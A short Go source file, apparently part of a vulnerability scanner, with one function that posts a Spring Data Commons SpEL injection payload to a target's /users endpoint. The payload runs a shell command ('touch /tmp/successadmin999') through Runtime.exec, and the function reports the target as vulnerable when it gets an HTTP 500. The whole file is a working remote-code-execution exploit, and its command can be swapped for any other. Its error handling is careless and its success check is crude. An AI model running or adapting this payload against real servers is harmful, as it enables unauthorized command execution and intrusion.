package lib

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
)

func SpringDataCommonsRce(url string, wg *sync.WaitGroup) {
	defer wg.Done()

	client := &http.Client{}

	req, err := http.NewRequest("POST", url+"/users", strings.NewReader("username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/successadmin999\")]=&password=&repeatedPassword="))
	if err != nil {
		// handle error
	}
	req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	resp, err := client.Do(req)
	if resp.StatusCode == 500 {
		fmt.Println(Green("[+] SpringDataCommonsRce 存在！"))
	} else {
		fmt.Println(Red("[-] SpringDataCommonsRce 不存在"))
	}

}
